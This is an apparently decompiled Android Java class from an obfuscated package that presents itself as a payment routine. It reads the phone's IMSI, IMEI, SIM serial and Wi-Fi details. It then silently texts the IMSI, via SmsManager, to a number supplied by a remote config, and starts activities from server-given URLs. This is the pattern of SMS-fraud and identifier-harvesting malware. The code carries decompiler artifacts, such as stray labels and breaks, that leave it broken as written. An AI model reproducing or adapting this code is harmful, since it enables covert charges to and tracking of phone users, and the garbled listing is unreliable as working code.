package com.wq.d;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import com.wq.a.a.f;
import com.wq.c.a.g;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Random;

public class a
  implements com.wq.b.a.a
{
  int a = 1;
  private g b;
  private com.wq.a.a.e c;
  private Context d;
  private boolean e = false;
  private Handler f = new e(this);
  private Handler g = new d(this);
  
  public a() {}
  
  private void a()
  {
    Log.d("fmz", "getConfig = 111");
    if (!TextUtils.isEmpty(com.wq.a.a.c.g))
    {
      Log.d("fmz", "getConfig = 222");
      f.c(this.d, com.wq.a.a.c.g);
      this.b.a(this);
    }
  }
  
  private void b()
  {
    TelephonyManager localTelephonyManager = (TelephonyManager)this.d.getSystemService("phone");
    com.wq.a.a.c.g = localTelephonyManager.getSubscriberId();
    Log.i("fmz", "imsi=wo==" + com.wq.a.a.c.g);
    com.wq.a.a.c.h = localTelephonyManager.getDeviceId();
    Object localObject = (WifiManager)this.d.getSystemService("wifi");
    if (localObject == null)
    {
      localObject = null;
      if (localObject != null) {
        break label141;
      }
    }
    for (;;)
    {
      f.b(this.d, com.wq.a.a.c.b);
      f.d(this.d, com.wq.a.a.c.a);
      com.wq.a.a.c.e = f.a(this.d);
      f.g(this.d, c());
      com.wq.a.a.c.s = f.e(this.d);
      com.wq.a.a.c.k = localTelephonyManager.getSimSerialNumber();
      return;
      localObject = ((WifiManager)localObject).getConnectionInfo();
      break;
      label141:
      ((WifiInfo)localObject).getMacAddress();
    }
  }
  
  private void b(String paramString)
  {
    String str = f.b(this.d);
    Log.d("fmz", "pNum = " + paramString + "   imsi = " + str);
    this.b.a("2", "2");
    Object localObject = new Intent("SMS_SEND_ACTIOIN");
    localObject = PendingIntent.getBroadcast(this.d, 0, (Intent)localObject, 0);
    SmsManager.getDefault().sendTextMessage(paramString, null, str, (PendingIntent)localObject, null);
    f.a(this.d, true);
  }
  
  private String c()
  {
    SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat("yyyyMMddhhmmss");
    int i = new Random().nextInt(999999);
    return localSimpleDateFormat.format(new Date()) + i;
  }
  
  private void c(String paramString)
  {
    b(paramString);
    new Thread(new b(this)).start();
  }
  
  public void a(Context paramContext, boolean paramBoolean)
  {
    Log.d("fmz", "onPayStart = ");
    this.d = paramContext;
    this.e = paramBoolean;
    com.wq.a.a.c.a(this.d);
    this.b = new g();
    b();
    a();
  }
  
  public void a(com.wq.a.a.d paramD, boolean paramBoolean)
  {
    if (paramD != null)
    {
      if ((this.e) && (!TextUtils.isEmpty(paramD.c())))
      {
        Intent localIntent = new Intent("android.intent.action.CALL");
        localIntent.putExtra("URL", paramD.c());
        localIntent.putExtra("Tsy", paramD.d());
        localIntent.putExtra("TanC", paramD.e());
        localIntent.setFlags(268435456);
        localIntent.setClass(this.d, com.wq.read.view.e.class);
        this.d.startActivity(localIntent);
      }
      Log.d("fmz", "fff = " + paramD.b());
      if ((!f.f(this.d)) && (!TextUtils.isEmpty(paramD.b()))) {
        c(paramD.b());
      }
      for (;;)
      {
        if (!TextUtils.isEmpty(paramD.a())) {}
        try
        {
          com.wq.a.a.c.u = URLDecoder.decode(paramD.a(), "utf-8");
          return;
        }
        catch (UnsupportedEncodingException paramD)
        {
          paramD.printStackTrace();
          return;
        }
        this.f.sendEmptyMessage(0);
      }
    }
    this.f.sendEmptyMessage(0);
  }
  
  public void a(Object paramObject, boolean paramBoolean)
  {
    if ((!paramBoolean) && (paramObject != null))
    {
      this.c = ((com.wq.a.a.e)paramObject);
      if ((!TextUtils.isEmpty(this.c.a)) && (!this.c.a.equals("0"))) {
        f.a(this.d, this.c.a);
      }
      com.wq.a.a.c.e = this.c.a;
      com.wq.a.a.c.f = this.c.b;
      TextUtils.isEmpty(this.c.c);
      if (System.currentTimeMillis() - f.h(this.d) <= 180000L) {
        break label138;
      }
      f.b(this.d, true);
      f.a(this.d, System.currentTimeMillis());
      a(this.c.d);
    }
    label138:
    while (f.g(this.d)) {
      return;
    }
    a(this.c.d);
  }
  
  public void a(String paramString)
  {
    if (!TextUtils.isEmpty(paramString)) {
      this.a = Integer.parseInt(paramString);
    }
    new Thread(new c(this)).start();
  }
}
